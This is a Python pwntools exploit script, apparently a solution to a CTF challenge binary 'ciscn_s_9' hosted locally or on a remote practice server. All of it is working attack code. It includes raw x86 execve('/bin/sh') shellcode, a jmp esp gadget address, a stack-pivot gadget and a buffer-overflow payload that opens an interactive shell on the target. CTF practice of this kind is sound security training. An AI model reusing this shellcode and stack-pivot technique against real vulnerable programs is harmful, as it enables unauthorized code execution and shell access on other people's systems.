#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ciscn_s_9')
	elf = ELF('./ciscn_s_9',checksec=False)

else:
	p = remote('node3.buuoj.cn',27247)
	elf = ELF('./ciscn_s_9',checksec=False)




###stack pivot###

jmp_esp = 0x08048554
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
gadget = "sub esp,0x28;jmp esp"
gadget = asm(gadget)

payload = shellcode.ljust(0x24,'\x00') + p32(jmp_esp) + gadget
sla(">\n",payload)

ia()
